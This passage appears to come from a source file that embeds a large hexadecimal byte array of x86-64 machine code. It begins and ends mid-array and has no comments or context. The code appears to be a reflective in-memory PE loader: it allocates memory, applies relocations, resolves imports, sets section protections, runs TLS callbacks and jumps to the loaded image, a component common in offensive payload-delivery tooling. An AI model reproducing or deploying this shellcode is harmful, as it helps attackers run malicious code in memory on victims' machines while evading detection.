\n  0x4c, 0x89, 0x64, 0x24, 0x78, 0x85, 0xc0, 0x74, 0x0b, 0x3d, 0x03, 0x00, \n  0x00, 0x40, 0x0f, 0x85, 0x9a, 0x07, 0x00, 0x00, 0x48, 0x85, 0xc9, 0x0f, \n  0x84, 0x91, 0x07, 0x00, 0x00, 0x40, 0x38, 0x3b, 0x74, 0x65, 0x48, 0x8b, \n  0x54, 0x24, 0x50, 0x4c, 0x8d, 0x8d, 0x10, 0x03, 0x00, 0x00, 0xbf, 0x04, \n  0x00, 0x00, 0x00, 0x44, 0x8b, 0xc7, 0xff, 0x56, 0x60, 0x49, 0x8d, 0x5e, \n  0x54, 0x44, 0x8b, 0xcf, 0x8b, 0x13, 0x33, 0xc9, 0x41, 0xb8, 0x00, 0x30, \n  0x00, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x70, 0xff, 0x56, 0x48, 0x44, 0x8b, \n  0x03, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0x95, 0x28, 0x03, 0x00, 0x00, 0x48, \n  0x89, 0x44, 0x24, 0x58, 0xe8, 0xe7, 0x15, 0x00, 0x00, 0x44, 0x8b, 0x44, \n  0x24, 0x50, 0x33, 0xd2, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0xe8, \n  0xf4, 0x15, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x33, \n  0xff, 0xeb, 0x15, 0x48, 0x8b, 0x85, 0x18, 0x03, 0x00, 0x00, 0x49, 0x8d, \n  0x5e, 0x54, 0x48, 0x89, 0x5c, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x58, \n  0x44, 0x8b, 0x03, 0x49, 0x8b, 0xd7, 0xe8, 0xa9, 0x15, 0x00, 0x00, 0x48, \n  0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x44, 0x8b, 0xff, 0x49, 0x89, 0x44, \n  0x24, 0x30, 0x41, 0x0f, 0xb7, 0x44, 0x24, 0x14, 0x48, 0x83, 0xc0, 0x18, \n  0x49, 0x03, 0xc4, 0x48, 0x89, 0x45, 0x90, 0x66, 0x41, 0x3b, 0x7c, 0x24, \n  0x06, 0x73, 0x52, 0x4c, 0x8b, 0x75, 0x80, 0x4c, 0x8b, 0xe8, 0x41, 0x8b, \n  0xc7, 0x48, 0x8d, 0x3c, 0x80, 0x41, 0x8b, 0x5c, 0xfd, 0x0c, 0x48, 0x03, \n  0x9d, 0x28, 0x03, 0x00, 0x00, 0x41, 0x8b, 0x54, 0xfd, 0x14, 0x48, 0x8b, \n  0xcb, 0x45, 0x8b, 0x44, 0xfd, 0x10, 0x49, 0x03, 0xd6, 0xe8, 0x52, 0x15, \n  0x00, 0x00, 0x0f, 0xb6, 0x03, 0x41, 0xff, 0xc7, 0x41, 0x89, 0x44, 0xfd, \n  0x08, 0x41, 0x0f, 0xb7, 0x44, 0x24, 0x06, 0x44, 0x3b, 0xf8, 0x72, 0xc2, \n  0x4c, 0x8b, 0x75, 0x88, 0x33, 0xff, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, \n  0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x8b, 0x85, 0x20, 0x03, \n  0x00, 0x00, 0x4d, 0x8b, 0xd0, 0x4d, 0x2b, 0x56, 0x30, 0x85, 0xc0, 0x0f, \n  0x84, 0xf2, 0x00, 0x00, 0x00, 0x4d, 0x85, 0xd2, 0x0f, 0x84, 0xe9, 0x00, \n  0x00, 0x00, 0x41, 0x8b, 0x8c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x1c, 0x01, 0x4a, 0x8d, 0x04, 0x03, 0x4e, 0x8d, 0x0c, 0x01, 0x4c, 0x3b, \n  0xc8, 0x0f, 0x83, 0xcc, 0x00, 0x00, 0x00, 0x41, 0xbf, 0xff, 0x0f, 0x00, \n  0x00, 0x41, 0x39, 0x79, 0x04, 0x0f, 0x84, 0xbc, 0x00, 0x00, 0x00, 0x41, \n  0x8b, 0x41, 0x04, 0x4d, 0x8d, 0x59, 0x08, 0x49, 0x03, 0xc1, 0x4c, 0x3b, \n  0xd8, 0x0f, 0x84, 0x98, 0x00, 0x00, 0x00, 0xb9, 0x02, 0x00, 0x00, 0x00, \n  0x41, 0x0f, 0xb7, 0x13, 0x8b, 0xc2, 0x41, 0x23, 0xc7, 0x41, 0x03, 0x01, \n  0x41, 0x3b, 0x44, 0x24, 0x50, 0x73, 0x6d, 0x41, 0x8b, 0x09, 0x8b, 0xc2, \n  0x49, 0x23, 0xc7, 0x66, 0xc1, 0xea, 0x0c, 0x49, 0x03, 0xc0, 0x48, 0x03, \n  0xc8, 0x66, 0x83, 0xfa, 0x0a, 0x75, 0x05, 0x4c, 0x01, 0x11, 0xeb, 0x36, \n  0xb8, 0x03, 0x00, 0x00, 0x00, 0x66, 0x3b, 0xd0, 0x75, 0x05, 0x41, 0x8b, \n  0xc2, 0xeb, 0x24, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x66, 0x3b, 0xd0, 0x75, \n  0x0c, 0x49, 0x8b, 0xc2, 0x48, 0xc1, 0xe8, 0x10, 0x0f, 0xb7, 0xc0, 0xeb, \n  0x0e, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x66, 0x3b, 0xd0, 0x75, 0x15, 0x41, \n  0x0f, 0xb7, 0xc2, 0x48, 0x01, 0x01, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, \n  0x00, 0xb9, 0x02, 0x00, 0x00, 0x00, 0xeb, 0x0c, 0x66, 0x85, 0xd2, 0x0f, \n  0x85, 0x38, 0x05, 0x00, 0x00, 0x48, 0x8b, 0xc8, 0x41, 0x8b, 0x41, 0x04, \n  0x4c, 0x03, 0xd9, 0x49, 0x03, 0xc1, 0x4c, 0x3b, 0xd8, 0x0f, 0x85, 0x6d, \n  0xff, 0xff, 0xff, 0x4a, 0x8d, 0x04, 0x03, 0x4d, 0x8b, 0xcb, 0x4c, 0x3b, \n  0xd8, 0x0f, 0x82, 0x3a, 0xff, 0xff, 0xff, 0x41, 0x8b, 0x84, 0x24, 0x90, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xb6, 0x00, 0x00, 0x00, 0x49, \n  0x8d, 0x1c, 0x00, 0x39, 0x7b, 0x0c, 0x0f, 0x84, 0xa9, 0x00, 0x00, 0x00, \n  0x4c, 0x8b, 0xb5, 0x18, 0x03, 0x00, 0x00, 0x8b, 0x53, 0x0c, 0x48, 0x8b, \n  0xce, 0x49, 0x03, 0xd0, 0xe8, 0xdf, 0x0b, 0x00, 0x00, 0x4c, 0x8b, 0x85, \n  0x28, 0x03, 0x00, 0x00, 0x4c, 0x8b, 0xe8, 0x8b, 0x3b, 0x44, 0x8b, 0x7b, \n  0x10, 0x49, 0x03, 0xf8, 0x4d, 0x03, 0xf8, 0x48, 0x8b, 0x0f, 0x33, 0xc0, \n  0x48, 0x85, 0xc9, 0x74, 0x55, 0x79, 0x08, 0x44, 0x8b, 0xc9, 0x45, 0x33, \n  0xc0, 0xeb, 0x2c, 0x4e, 0x8d, 0x24, 0x01, 0x41, 0x39, 0x46, 0x04, 0x74, \n  0x1a, 0x49, 0x8d, 0x54, 0x24, 0x02, 0x48, 0x8b, 0xce, 0xe8, 0x32, 0xf0, \n  0xff, 0xff, 0x85, 0xc0, 0x74, 0x09, 0x48, 0x8b, 0x86, 0xe0, 0x01, 0x00, \n  0x00, 0xeb, 0x13, 0x45, 0x33, 0xc9, 0x4d, 0x8d, 0x44, 0x24, 0x02, 0x49, \n  0x8b, 0xd5, 0x48, 0x8b, 0xce, 0xe8, 0x66, 0x0c, 0x00, 0x00, 0x49, 0x89, \n  0x07, 0x48, 0x83, 0xc7, 0x08, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, \n  0x49, 0x83, 0xc7, 0x08, 0xeb, 0xa1, 0x48, 0x83, 0xc3, 0x14, 0x33, 0xff, \n  0x39, 0x7b, 0x0c, 0x0f, 0x85, 0x6e, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0x75, \n  0x88, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0x4c, 0x8b, 0x64, 0x24, \n  0x78, 0x41, 0x8b, 0x84, 0x24, 0xf0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, \n  0x84, 0x86, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x78, 0x04, 0x49, 0x03, 0xf8, \n  0x8b, 0x07, 0x85, 0xc0, 0x74, 0x77, 0x8b, 0xd0, 0x48, 0x8b, 0xce, 0x49, \n  0x03, 0xd0, 0xe8, 0x21, 0x0b, 0x00, 0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, \n  0x00, 0x00, 0x4c, 0x8b, 0xe0, 0x33, 0xc0, 0x4d, 0x85, 0xe4, 0x74, 0x4a, \n  0x8b, 0x5f, 0x0c, 0x44, 0x8b, 0x7f, 0x08, 0x49, 0x03, 0xd8, 0x4d, 0x03, \n  0xf8, 0xeb, 0x33, 0x79, 0x08, 0x44, 0x8b, 0x0b, 0x4c, 0x8b, 0xc0, 0xeb, \n  0x0a, 0x49, 0x83, 0xc0, 0x02, 0x44, 0x8b, 0xc8, 0x4c, 0x03, 0xc1, 0x49, \n  0x8b, 0xd4, 0x48, 0x8b, 0xce, 0xe8, 0xca, 0x0b, 0x00, 0x00, 0x49, 0x89, \n  0x07, 0x48, 0x83, 0xc3, 0x08, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, \n  0x49, 0x83, 0xc7, 0x08, 0x33, 0xc0, 0x48, 0x8b, 0x0b, 0x48, 0x85, 0xc9, \n  0x75, 0xc5, 0x48, 0x83, 0xc7, 0x20, 0x8b, 0x07, 0x85, 0xc0, 0x75, 0x8e, \n  0x4c, 0x8b, 0x64, 0x24, 0x78, 0x33, 0xff, 0x45, 0x8b, 0x64, 0x24, 0x28, \n  0x48, 0x8d, 0x4d, 0xa0, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x4d, 0x03, 0xe0, \n  0x4c, 0x89, 0x65, 0x80, 0x8d, 0x50, 0x7e, 0x41, 0x0f, 0x10, 0x06, 0x41, \n  0x0f, 0x10, 0x4e, 0x10, 0x0f, 0x11, 0x01, 0x41, 0x0f, 0x10, 0x46, 0x20, \n  0x0f, 0x11, 0x49, 0x10, 0x41, 0x0f, 0x10, 0x4e, 0x30, 0x0f, 0x11, 0x41, \n  0x20, 0x41, 0x0f, 0x10, 0x46, 0x40, 0x0f, 0x11, 0x49, 0x30, 0x41, 0x0f, \n  0x10, 0x4e, 0x50, 0x0f, 0x11, 0x41, 0x40, 0x41, 0x0f, 0x10, 0x46, 0x60, \n  0x0f, 0x11, 0x49, 0x50, 0x41, 0x0f, 0x10, 0x4e, 0x70, 0x4c, 0x03, 0xf2, \n  0x0f, 0x11, 0x41, 0x60, 0x48, 0x03, 0xca, 0x0f, 0x11, 0x49, 0xf0, 0x48, \n  0x83, 0xe8, 0x01, 0x75, 0xae, 0x49, 0x8b, 0x06, 0x41, 0xb8, 0x00, 0x30, \n  0x00, 0x00, 0x48, 0x89, 0x01, 0x33, 0xc9, 0x48, 0x8b, 0x45, 0xa0, 0x48, \n  0xc1, 0xe8, 0x30, 0x44, 0x8d, 0x49, 0x04, 0x48, 0x8d, 0x14, 0x80, 0x48, \n  0xc1, 0xe2, 0x03, 0xff, 0x56, 0x48, 0x44, 0x0f, 0xb7, 0x7d, 0xa6, 0x48, \n  0x8b, 0xc8, 0x48, 0x8b, 0x55, 0x90, 0x48, 0x8b, 0xd8, 0x48, 0x89, 0x44, \n  0x24, 0x60, 0x47, 0x8d, 0x04, 0xbf, 0x41, 0xc1, 0xe0, 0x03, 0xe8, 0x15, \n  0x12, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x39, 0x86, 0x74, 0x05, \n  0x00, 0x00, 0x75, 0x58, 0x40, 0x38, 0xbe, 0x25, 0x06, 0x00, 0x00, 0x75, \n  0x29, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x33, 0xd2, 0x48, 0x8b, 0x8d, 0x28, \n  0x03, 0x00, 0x00, 0x44, 0x8b, 0x03, 0xe8, 0x09, 0x12, 0x00, 0x00, 0x44, \n  0x8b, 0x03, 0x49, 0x8d, 0x8d, 0x28, 0x05, 0x00, 0x00, 0x33, 0xd2, 0xe8, \n  0xf8, 0x11, 0x00, 0x00, 0xeb, 0x21, 0x48, 0x8b, 0x44, 0x24, 0x58, 0x48, \n  0x85, 0xc0, 0x74, 0x1c, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, 0xd0, \n  0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x44, 0x8b, 0x03, 0xe8, 0xb5, \n  0x11, 0x00, 0x00, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x40, 0x38, 0xbe, 0x25, \n  0x06, 0x00, 0x00, 0x0f, 0x85, 0x8a, 0x00, 0x00, 0x00, 0xff, 0x96, 0xb0, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x95, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8b, \n  0xc8, 0xff, 0x96, 0x20, 0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xe3, \n  0x02, 0x00, 0x00, 0x48, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x39, 0xbd, \n  0x20, 0x03, 0x00, 0x00, 0x48, 0x89, 0x7c, 0x24, 0x50, 0x48, 0x0f, 0x45, \n  0xc7, 0x48, 0x89, 0x85, 0x28, 0x03, 0x00, 0x00, 0xff, 0x96, 0xb0, 0x00, \n  0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x4c, 0x8d, 0x85, 0x28, 0x03, \n  0x00, 0x00, 0xc7, 0x44, 0x24, 0x48, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8b, \n  0xd0, 0x89, 0x7c, 0x24, 0x40, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x89, 0x44, \n  0x24, 0x38, 0x45, 0x33, 0xc9, 0x48, 0x8d, 0x44, 0x24, 0x50, 0x48, 0x89, \n  0x44, 0x24, 0x30, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, \n  0x20, 0xff, 0x96, 0x18, 0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0x77, \n  0x02, 0x00, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x50, 0x4c, 0x8d, 0x8d, 0x10, \n  0x03, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x41, 0xb8, \n  0x08, 0x00, 0x00, 0x00, 0xff, 0x56, 0x60, 0x44, 0x8b, 0xf7, 0x45, 0x85, \n  0xff, 0x0f, 0x84, 0xeb, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x6c, 0x24, 0x60, \n  0x48, 0x8d, 0x7b, 0x0c, 0x8b, 0x9d, 0x18, 0x03, 0x00, 0x00, 0x45, 0x33, \n  0xe4, 0x45, 0x8d, 0x54, 0x24, 0x01, 0x8b, 0x57, 0x18, 0x44, 0x8b, 0xc2, \n  0x8b, 0xca, 0x41, 0xc1, 0xe8, 0x1e, 0xc1, 0xea, 0x1d, 0x41, 0x23, 0xd2, \n  0xc1, 0xe9, 0x1f, 0x85, 0xd1, 0x0f, 0x85, 0x9a, 0x00, 0x00, 0x00, 0x41, \n  0x85, 0xd0, 0x74, 0x07, 0xbb, 0x20, 0x00, 0x00, 0x00, 0xeb, 0x46, 0x44, \n  0x8b, 0xca, 0x8b, 0xc1, 0x45, 0x33, 0xca, 0x41, 0x23, 0xc0, 0x41, 0x85, \n  0xc1, 0x74, 0x12, 0x8a, 0x86, 0x25, 0x06, 0x00, 0x00, 0xf6, 0xd8, 0x1b, \n  0xdb, 0x83, 0xe3, 0xfc, 0x83, 0xc3, 0x08, 0xeb, 0x24, 0x41, 0x33, 0xca, \n  0x41, 0x8b, 0xc0, 0x41, 0x33, 0xc2, 0x23, 0xc1, 0x85, 0xc2, 0x74, 0x07, \n  0xbb, 0x10, 0x00, 0x00, 0x00, 0xeb, 0x0e, 0x41, 0x23, 0xc8, 0xb8, 0x02, \n  0x00, 0x00, 0x00, 0x41, 0x85, 0xc9, 0x0f, 0x45, 0xd8, 0x44, 0x8b, 0x07, \n  0x41, 0x8d, 0x47, 0xff, 0x4c, 0x8b, 0x95, 0x28, 0x03, 0x00, 0x00, 0x4d, \n  0x03, 0xd0, 0x44, 0x3b, 0xf0, 0x73, 0x12, 0x41, 0x8d, 0x46, 0x01, 0x48, \n  0x8d, 0x04, 0x80, 0x41, 0x8b, 0x54, 0xc5, 0x0c, 0x49, 0x2b, 0xd0, 0xeb, \n  0x03, 0x8b, 0x57, 0x04, 0x4c, 0x8d, 0x8d, 0x10, 0x03, 0x00, 0x00, 0x44, \n  0x89, 0xa5, 0x10, 0x03, 0x00, 0x00, 0x44, 0x8b, 0xc3, 0x49, 0x8b, 0xca, \n  0xff, 0x56, 0x60, 0x41, 0xba, 0x01, 0x00, 0x00, 0x00, 0x45, 0x03, 0xf2, \n  0x48, 0x83, 0xc7, 0x28, 0x45, 0x3b, 0xf7, 0x0f, 0x82, 0x39, 0xff, 0xff, \n  0xff, 0x4c, 0x8b, 0x65, 0x80, 0x33, 0xff, 0x4c, 0x8b, 0xad, 0x18, 0x03, \n  0x00, 0x00, 0x8b, 0x55, 0xcc, 0x4c, 0x8d, 0x8d, 0x10, 0x03, 0x00, 0x00, \n  0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x41, 0xb8, 0x02, 0x00, 0x00, \n  0x00, 0x89, 0xbd, 0x10, 0x03, 0x00, 0x00, 0xff, 0x56, 0x60, 0x48, 0x8b, \n  0x4c, 0x24, 0x78, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x81, 0xd0, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x28, 0x03, 0x00, 0x00, 0x85, 0xc0, \n  0x74, 0x27, 0x48, 0x8b, 0x5c, 0x08, 0x18, 0x48, 0x85, 0xdb, 0x74, 0x1d, \n  0xeb, 0x13, 0x45, 0x33, 0xc0, 0x41, 0x8b, 0xd6, 0xff, 0xd0, 0x48, 0x8b, \n  0x8d, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8d, 0x5b, 0x08, 0x48, 0x8b, 0x03, \n  0x48, 0x85, 0xc0, 0x75, 0xe5, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x41, 0x39, \n  0x45, 0x00, 0x0f, 0x85, 0x72, 0x01, 0x00, 0x00, 0x8b, 0x45, 0xc8, 0x45, \n  0x33, 0xc0, 0x48, 0x03, 0xc1, 0x41, 0x8b, 0xd6, 0xff, 0xd0, 0x41, 0x38, \n  0xbd, 0x0c, 0x03, 0x00, 0x00, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x8b, \n  0x45, 0x28, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0x49, 0x8d, 0x0c, \n  0x00, 0x85, 0xc0, 0x0f, 0x84, 0xcf, 0x01, 0x00, 0x00, 0x8b, 0x59, 0x18, \n  0x85, 0xdb, 0x0f, 0x84, 0xc4, 0x01, 0x00, 0x00, 0x8b, 0x79, 0x1c, 0x44, \n  0x8b, 0x79, 0x20, 0x49, 0x03, 0xf8, 0x44, 0x8b, 0x71, 0x24, 0x4d, 0x03, \n  0xf8, 0x4d, 0x03, 0xf0, 0x8d, 0x43, 0xff, 0x41, 0x8b, 0x0c, 0x87, 0x49, \n  0x8d, 0x95, 0x0c, 0x03, 0x00, 0x00, 0x49, 0x03, 0xc8, 0x44, 0x8b, 0xe0, \n  0x8b, 0xd8, 0xe8, 0x65, 0x0f, 0x00, 0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, \n  0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x8c, 0x00, 0x00, 0x00, 0x85, 0xdb, \n  0x75, 0xd2, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0x4d, 0x85, 0xc0, \n  0x74, 0x53, 0x0f, 0xb7, 0x45, 0xa6, 0xbf, 0x00, 0xc0, 0x00, 0x00, 0x48, \n  0x8b, 0x4c, 0x24, 0x60, 0x44, 0x8b, 0xc7, 0x48, 0x8d, 0x14, 0x80, 0x48, \n  0xc1, 0xe2, 0x03, 0xff, 0x56, 0x50, 0x48, 0x8b, 0x44, 0x24, 0x58, 0x48, \n  0x85, 0xc0, 0x74, 0x0c, 0x8b, 0x55, 0xf4, 0x44, 0x8b, 0xc7, 0x48, 0x8b, \n  0xc8, 0xff, 0x56, 0x50, 0xff, 0x96, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8b, \n  0x95, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8b, 0xc8, 0xff, 0x96, 0x20, 0x02, \n  0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0xff, 0x96, 0xf0, 0x00, 0x00, \n  0x00, 0x45, 0x8b, 0x85, 0x24, 0x05, 0x00, 0x00, 0x49, 0x8d, 0x8d, 0x28, \n  0x05, 0x00, 0x00, 0x33, 0xd2, 0xe8, 0xc2, 0x0e, 0x00, 0x00, 0x48, 0x81, \n  0xc4, 0xc8, 0x03, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, \n  0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0x43, 0x0f, 0xb7, 0x04, 0x66, 0x8b, \n  0x1c, 0x87, 0x49, 0x03, 0xd8, 0x0f, 0x84, 0x67, 0xff, 0xff, 0xff, 0x4c, \n  0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0x45, 0x33, 0xf6, 0x49, 0x8d, 0xbd, \n  0x0c, 0x04, 0x00, 0x00, 0x44, 0x38, 0x37, 0x74, 0x41, 0x45, 0x39, 0xb5, \n  0x0c, 0x05, 0x00, 0x00, 0x74, 0x22, 0x48, 0x8d, 0x85, 0xb0, 0x00, 0x00, \n  0x00, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x01, 0x00, 0x00, 0x41, 0x83, 0xc9, \n  0xff, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8b, 0xc7, 0x33, 0xd2, 0x33, \n  0xc9, 0xff, 0x56, 0x70, 0x45, 0x39, 0xb5, 0x0c, 0x05, 0x00, 0x00, 0x48, \n  0x8d, 0x8d, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x0f, 0x44, 0xcf, 0xff, 0xd3, \n  0xeb, 0x6e, 0xff, 0xd3, 0xeb, 0x6a, 0x4d, 0x8d, 0x85, 0x0c, 0x04, 0x00, \n  0x00, 0x41, 0x38, 0x38, 0x74, 0x2e, 0x48, 0x8d, 0x85, 0xb0, 0x00, 0x00, \n  0x00, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x01, 0x00, 0x00, 0x41, 0x83, 0xc9, \n  0xff, 0x48, 0x89, 0x44, 0x24, 0x20, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x56, \n  0x70, 0x48, 0x8d, 0x95, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xce, 0xe8, \n  0x7c, 0x03, 0x00, 0x00, 0x41, 0x39, 0x7d, 0x04, 0x74, 0x3c, 0x48, 0x89, \n  0x7c, 0x24, 0x28, 0x45, 0x33, 0xc9, 0x4d, 0x8b, 0xc4, 0x89, 0x7c, 0x24, \n  0x20, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x96, 0x88, 0x00, 0x00, 0x00, 0x48, \n  0x85, 0xc0, 0x74, 0x0c, 0x83, 0xca, 0xff, 0x48, 0x8b, 0xc8, 0xff, 0x96, \n  0x80, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x85, 0x28, 0x03, 0x00, 0x00, 0xeb, \n  0x22, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0xeb, 0xee, 0x65, 0x48, \n  0x8b, 0x0c, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x49, 0x60, 0x41, \n  0xff, 0xd4, 0xeb, 0xdc, 0x4c, 0x8b, 0xad, 0x18, 0x03, 0x00, 0x00, 0xb8, \n  0x03, 0x00, 0x00, 0x00, 0x39, 0x86, 0x30, 0x02, 0x00, 0x00, 0x0f, 0x85, \n  0x6d, 0xfe, 0xff, 0xff, 0x83, 0xc9, 0xff, 0xff, 0x56, 0x68, 0x4c, 0x8b, \n  0x85, 0x28, 0x03, 0x00, 0x00, 0xe9, 0x5b, 0xfe, 0xff, 0xff, 0xcc, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x20, 0x55, 0x57, \n  0x41, 0x56, 0x48, 0x8d, 0xac, 0x24, 0xc0, 0xfc, 0xff, 0xff, 0x48, 0x81, \n  0xec, 0x40, 0x04, 0x00, 0x00, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0x48, \n  0x8b, 0x91, 0x58, 0x0d, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x30, 0x00, 0x00, \n  0x33, 0xc9, 0x48, 0x8d, 0x14, 0x55, 0x02, 0x00, 0x00, 0x00, 0x44, 0x8d, \n  0x49, 0x04, 0xff, 0x56, 0x48, 0x4c, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x0f, \n  0x84, 0x94, 0x02, 0x00, 0x00, 0x8b, 0x8b, 0x24, 0x05, 0x00, 0x00, 0x4c, \n  0x8d, 0x83, 0x28, 0x05, 0x00, 0x00, 0x03, 0xc9, 0x83, 0xcb, 0xff, 0x89, \n  0x4c, 0x24, 0x28, 0x44, 0x8b, 0xcb, 0x33, 0xc9, 0x48, 0x89, 0x44, 0x24, \n  0x20, 0x33, 0xd2, 0xff, 0x56, 0x70, 0x83, 0x65, 0xe8, 0x00, 0x48, 0x8d, \n  0x45, 0x80, 0x83, 0x65, 0xf8, 0x00, 0x48, 0x8d, 0x55, 0x08, 0x48, 0x89, \n  0x45, 0xe0, 0x48, 0x8b, 0xce, 0x48, 0x8d, 0x05, 0x74, 0xdb, 0xff, 0xff, \n  0x48, 0x89, 0x75, 0x38, 0x48, 0x89, 0x45, 0x80, 0x48, 0x8d, 0x05, 0xf9, \n  0xd9, 0xff, 0xff, 0x48, 0x89, 0x45, 0x88, 0x48, 0x8d, 0x05, 0x56, 0xda, \n  0xff, 0xff, 0x48, 0x89, 0x45, 0x90, 0x48, 0x8d, 0x05, 0xd3, 0xda, 0xff, \n  0xff, 0x48, 0x89, 0x45, 0x98, 0x48, 0x8d, 0x05, 0x50, 0xda, 0xff, 0xff, \n  0x48, 0x89, 0x45, 0xa0, 0x48, 0x8d, 0x05, 0x41, 0xda, 0xff, 0xff, 0x48, \n  0x89, 0x45, 0xa8, 0x48, 0x8d, 0x05, 0x36, 0xda, 0xff, 0xff, 0x48, 0x89, \n  0x45, 0xb0, 0x48, 0x8d, 0x05, 0x2b, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, \n  0xb8, 0x48, 0x8d, 0x05, 0xb8, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc0, \n  0x48, 0x8d, 0x05, 0x15, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc8, 0x48, \n  0x8d, 0x05, 0x0a, 0xda, 0xff, 0xff, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x8d, \n  0x44, 0x24, 0x50, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x05, 0x92, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8d, 0x05, 0x76, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8d, 0x05, 0xd2, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8d, 0x05, 0x66, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8d, 0x05, 0x5a, 0xd9, \n  0xff, 0xff, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48, 0x8d, 0x45, 0x40, 0x48, \n  0x89, 0x45, 0x08, 0x48, 0x89, 0x75, 0x00, 0xe8, 0x90, 0xe5, 0xff, 0xff, \n  0x33, 0xd2, 0x33, 0xc9, 0xff, 0x96, 0xa8, 0x01, 0x00, 0x00, 0x85, 0xc0, \n  0x0f, 0x85, 0x4c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x85, 0x60, 0x03, 0x00, \n  0x00, 0x33, 0xd2, 0x4c, 0x8d, 0x8e, 0xd0, 0x08, 0x00, 0x00, 0x48, 0x89, \n  0x44, 0x24, 0x20, 0x48, 0x8d, 0x8e, 0xb0, 0x08, 0x00, 0x00, 0x44, 0x8d, \n  0x43, 0x04, 0xff, 0x96, 0xb0, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, \n  0x1e, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x8d, 0x60, 0x03, 0x00, 0x00, 0x48, \n  0x8d, 0x96, 0x10, 0x09, 0x00, 0x00, 0x4c, 0x8d, 0x85, 0x70, 0x03, 0x00, \n  0x00, 0x48, 0x8b, 0x01, 0xff, 0x10, 0x85, 0xc0, 0x0f, 0x85, 0xe2, 0x00, \n  0x00, 0x00, 0x48, 0x8b, 